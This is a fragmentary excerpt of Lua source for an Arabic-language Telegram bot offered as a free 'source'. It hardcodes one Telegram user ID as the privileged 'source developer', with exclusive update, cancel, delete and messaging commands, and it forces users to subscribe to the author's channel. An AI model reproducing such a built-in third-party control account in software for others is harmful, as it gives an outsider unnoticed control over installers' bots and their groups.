...
devsource = Redis:get(Fast..'devsource') or "k5kil"
devsource2 = Redis:get(Fast..'devsource') or "k5kil"
function var(value)  
...
ControllerAll = false
local ListSudos = {Sudo_Id,1486460019,1486460019,1486460019}
...
if UserId == 1486460019 then
Status = true
elseif UserId == 1486460019 then
Status = true
elseif UserId == 1486460019 then  
Status = true
...
xname =  (Redis:get(Fast.."Name:Bot") or "مجاني") 
...
if text == 'كانسل' and tonumber(senderr) == tonumber(1486460019) then
...
if text == 'ابديت' and tonumber(senderr) == tonumber(1486460019) then
...
if tonumber(senderr) == 1486460019 then
msg.Name_Controller = 'مطـور السـورس  '
msg.The_Controller = 1
elseif tonumber(senderr) == 1486460019 then
msg.Name_Controller = 'مطـور السـورس  '
msg.The_Controller = 1
elseif tonumber(senderr) == 1486460019 then
msg.Name_Controller = 'مطـور السـورس  '
...
if text and text:match('^حذف (%d+)$') and tonumber(senderr) == tonumber(1486460019) then
...
if text == 'احمدو' or text == 'مجاني' or text == 'احمد'  then
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = 'Dev', url = 't.me/k5kil'}, 
},
}
}
return send(msg_chat_id,msg_id,"[rino](tg://user?id=1486460019)","md",true, false, false, true, reply_markup)
end
if text == 'مصنع السورس' or text == 'المصنع' or text == 'مصنع'  then
  ...
  data = {
  {
  {text = '𝐆𝐔𝐌𝐁𝐀𝐋𝐋', url = 'https://t.me/gumball_free'}, 
  },
  }
  }
  return send(msg_chat_id,msg_id,"[𝐆𝐔𝐌𝐁𝐀𝐋𝐋](https://t.me/gumball_free)","md",true, false, false, true, reply_markup)
  end
if text == "صورتي" then
...
if ChannelJoin(msg) == false then
local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/gumball_free'}, },}}
return send(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
...
if text and text:match("^ss (.*)$") and tonumber(senderr) == tonumber(1486460019) then
local txx = "\n"
...
data = {
{
{text = 'الشروحات', url = 't.me/gumball_free'..devsource},{text = 'لتنصيب بوت', url = 't.me/k5kil'..devsource2},  
},
{
{text = 'سورس مجاني', url = 'http://t.me/gumball_free'..chsource..''}, 
},
{
},
}
...
local CmdStart = '*\n• أهلآ بك في بوت '..(Redis:get(Fast.."Name:Bot") or "مجاني")..
